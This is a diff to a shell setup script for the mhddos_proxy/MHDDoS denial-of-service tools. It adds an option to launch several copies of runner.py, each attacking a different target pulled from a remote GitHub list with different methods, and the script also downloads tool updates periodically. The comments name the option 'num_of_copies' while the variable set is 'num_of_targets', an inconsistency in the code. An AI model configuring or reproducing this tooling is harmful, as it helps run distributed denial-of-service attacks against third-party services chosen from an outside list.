@@ -7,6 +7,12 @@
 ## It allows to download updates for mhddos_proxy, MHDDoS and target list.
 restart_interval=1800
 
+## "num_of_copies" allows to start several copies of runner.py.
+## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets
+## This is different from "multiple targets" in runner.py. "multiple targets" will attack with same method.
+## "num_of_copies" allows to launch several copies of runner.py and targets can be attacked with different methods.
+num_of_targets=2
+
 sudo apt update
 
 # Install git if it doesn't installed already
